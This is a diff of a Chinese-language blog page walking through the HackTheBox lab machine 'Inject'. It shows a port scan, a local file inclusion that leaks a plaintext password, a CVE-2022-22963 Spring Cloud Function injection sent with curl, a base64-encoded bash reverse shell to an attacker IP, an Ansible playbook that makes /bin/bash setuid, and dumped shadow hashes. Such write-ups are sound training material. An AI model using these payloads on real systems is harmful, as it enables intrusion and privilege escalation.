@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;533 10.10.11.204   端口扫描22和8080: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.204Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-13 11:15 CSTNmap s">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;533 10.10.11.204                                                                                                              端口扫描22和8080: 12345678910111213141">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Inject - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/03/13/Inject-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;533 10.10.11.204   端口扫描22和8080: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.204Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-13 11:15 CSTNmap s">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;533 10.10.11.204                                                                                                              端口扫描22和8080: 12345678910111213141">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031301.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031302.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031303.jpg">
@@ -130,7 +130,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -219,44 +219,128 @@
 <li><a href="https://app.hackthebox.com/machines/533" target="_blank" rel="noopener">https://app.hackthebox.com/machines/533</a></li>
 <li><strong>10.10.11.204</strong></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和8080:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.204</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 11:15 CST</span><br><span class="line">Nmap scan report for 10.10.11.204</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)</span><br><span class="line">|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)</span><br><span class="line">|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)</span><br><span class="line">8080/tcp open  nagios-nsca Nagios NSCA</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Home</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 45.01 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>一个类似云盘的东西：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031302.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>简单测试上传查看，发现可能存在LFI：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031303.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031303.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>验证存在：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031304.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>并且可以直接查看目录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031305.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="home-frank-m2-settings-xml"><a href="#home-frank-m2-settings-xml" class="headerlink" title="/home/frank/.m2/settings.xml"></a>/home/frank/.m2/settings.xml</h2><p>读文件，得到phil的密码：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>Inject<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">username</span>&gt;</span>phil<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">password</span>&gt;</span>DocPhillovestoInject123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">privateKey</span>&gt;</span>$&#123;user.home&#125;/.ssh/id_dsa<span class="tag">&lt;/<span class="name">privateKey</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filePermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">filePermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directoryPermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">directoryPermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031306.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031306.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>但并不能直接直接SSH登录</p>
 <h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><p>找到应用目录，读取pom，发现存在漏洞的组件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031307.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031307.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <ul>
 <li>me2nuk/CVE-2022-22963: Spring Cloud Function Vulnerable Application / CVE-2022-22963<br><a href="https://github.com/me2nuk/CVE-2022-22963" target="_blank" rel="noopener">https://github.com/me2nuk/CVE-2022-22963</a></li>
 </ul>
 <h1 id="CVE-2022-22963"><a href="#CVE-2022-22963" class="headerlink" title="CVE-2022-22963"></a>CVE-2022-22963</h1><p>测试存在：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031308.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031308.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>Java runtime exec需要编码处理，得到frank用户 shell</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/10.10.14.4/4444 &lt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjQvNDQ0NCA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c &#123;echo,YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjQvNDQ0NCA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;")' --data-raw 'data' -v</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031309.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031309.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>现在可以使用密码切换到phil用户，得到user flag:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031310.jpg" alt=""> </p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031310.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure> 
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>定期使用ansible运行指定目录下的playbook，原本的playbok我们没有权限，但我们在staff组中，对tasks目录有写权限，所以可以直接创建新的：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031311.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031311.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>自定义一个playbook执行任意命令，等待触发：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031312.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031312.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="miao-yml"><a href="#miao-yml" class="headerlink" title="miao.yml"></a>miao.yml</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">- hosts:</span> <span class="string">localhost</span></span><br><span class="line"><span class="attr">  tasks:</span></span><br><span class="line"><span class="attr">    - name:</span> <span class="string">PE</span></span><br><span class="line">      <span class="string">ansible.builtin.shell:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        chmod +s /bin/bash</span></span><br><span class="line"><span class="string"></span><span class="attr">      become:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$KeHoGfvAPeHOqplu$tC&#x2F;4gh419crGM6.btFzCazMPFH0gaX.x&#x2F;Qp.PJZCoizg4wYcl48wtOGA3lwxNjooq9MDzJZJvzav7V37p9aMT1:19381:0:99999:7:::</span><br><span class="line">frank:$6$fBwyjkLHtSuUCpHx$6G9LujV0iop.QxbfQpwDcSaRWDDobBlVMo5.6gVJVnQabcbmFwdkwFfmJNAX27u3Cdg9ZO5977pCst7hF98kc&#x2F;:19381:0:99999:7:::</span><br><span class="line">phil:$6$Z.KhzrHH6PXCuNbO$dL9xyMTydwjYPcrunZb7OO9a0hCwrUPOeQfdum818rW4NPtsiXEji15NMmikgYBGLDbWPUfLIpCpOuCRxYedM.:19388:0:99999:7:::</span><br></pre></td></tr></table></figure>
